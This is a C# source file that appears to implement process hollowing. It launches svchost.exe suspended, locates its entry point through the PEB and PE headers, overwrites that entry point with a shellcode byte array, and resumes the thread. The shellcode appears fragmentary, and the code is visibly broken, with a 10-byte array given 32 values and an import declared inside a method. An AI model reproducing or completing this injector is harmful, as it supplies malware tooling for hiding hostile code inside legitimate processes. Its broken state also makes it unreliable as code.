using System;

using System.Runtime.InteropServices;
using System.Security.Claims;
using System.Threading;

namespace Hollower_2 
{ 
    struct STARTUPINFO
{
    public Int32 cb;
    public IntPtr lpReserved;
    public IntPtr lpDesktop;
    public IntPtr lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize; 
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[StructLayout(LayoutKind.Sequential)]
 struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
[StructLayout(LayoutKind.Sequential)]
 struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}

    class Program
    {

   



[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
//svchost is running in the bground 
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

    uint tmp = 0;
    IntPtr hProcess = pi.hProcess;
    ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
    IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
    byte[] addrBuf = new byte[IntPtr.Size];
    IntPtr nRead = IntPtr.Zero;
    ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
    IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
    byte[] data = new byte[0x200];
    ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
    uint opthdr = e_lfanew_offset + 0x28;
    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

    byte[] buf = new byte[10] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,
0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,
0xff,0xd5};


    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);
          //  static void WriteProcessMemory(nint hProcess, nint addressOfEntryPoint, byte[] buf, int length, out nint nRead);
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
    ResumeThread(pi.hThread);
}
}
}     
